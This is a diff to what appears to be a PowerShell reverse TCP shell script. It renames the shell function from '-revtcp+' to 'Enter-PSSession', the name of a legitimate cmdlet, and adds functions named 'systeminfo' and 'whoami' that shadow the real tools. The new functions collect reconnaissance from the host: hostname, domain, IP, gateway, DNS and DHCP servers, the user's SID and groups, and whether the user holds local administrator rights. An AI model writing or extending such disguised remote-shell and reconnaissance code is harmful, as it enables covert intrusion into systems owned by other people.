@@ -4,8 +4,11 @@ using namespace 'system.io'
 using namespace 'system.text'
 using namespace 'system.net.sockets'
 using namespace 'system.diagnostics'
+using namespace 'system.collections'
+using namespace 'system.security.principal'
+using namespace 'system.net.networkinformation'
 
-function -revtcp+ {
+function Enter-PSSession {
     param(
         [Parameter(Position=0)]
         [string]$__,
@@ -89,5 +92,63 @@ function -revtcp+ {
         $_writer.close();
         $_sock.close();
         $_.Dispose();
+    }
+}
+
+function systeminfo {
+    begin{}
+    process{
+        $_ = ([NetworkInterface]::GetAllNetworkInterfaces().where({
+            $_.OperationalStatus -ieq "up" -and ("ethernet","wireless80211") -icontains $_.NetworkInterfaceType
+        }) | Sort-Object -Property Speed -Descending)[0].foreach({
+            [pscustomobject]@{
+                node = [IPGlobalProperties]::GetIPGlobalProperties().foreach({
+                    $__ = 'local'
+                    if($_.domainname){$__ = ${_}.domainname}
+                    [pscustomobject]@{
+                        hostname = ${_}.hostname.tolower()
+                        domain = ${__}
+                        fqdn = "$(${_}.hostname).${__}".tolower()
+                    }
+                })
+                nic = [pscustomobject]@{
+                    name = $_.name
+                    info = $_.description
+                    type = $_.networkinterfacetype
+                    ip = $_.GetIPProperties().UnicastAddresses.foreach({
+                            if($_.Address.AddressFamily -ieq "InterNetwork"){$_.Address.IPAddressToString}
+                        })[0]
+                    }
+                    network = $_.GetIPProperties().foreach({
+                        [pscustomobject]@{
+                            gateway = $_.GatewayAddresses.Address.IPAddressToString
+                            dhcp = $_.DhcpServerAddresses.IPAddressToString
+                            dns = $_.DnsAddresses.IPAddressToString
+                        }
+                    })
+                }
+        })
+   }
+   end{
+       return $_
+   }
+}
+
+function whoami {
+    param()
+    begin{}
+    process{}
+    end{
+        return [windowsidentity]::GetCurrent().foreach({
+            $__ = [list[string]]::new($_.Name.split("\"));$__.Reverse();
+            [pscustomobject]@{
+                sid = $_.User
+                type = $_.AuthenticationType
+                login = $__ -join "@"
+                privileged = $_.groups.value -contains "S-1-5-32-544"
+                domain = $__[1]
+                groups = $_.groups.foreach({$_=[securityidentifier]::new($_);if(-not $_.IsAccountSid()){$_.Translate([ntaccount]).ToString()}}) | sort-object
+            }
+        })
     }
 }
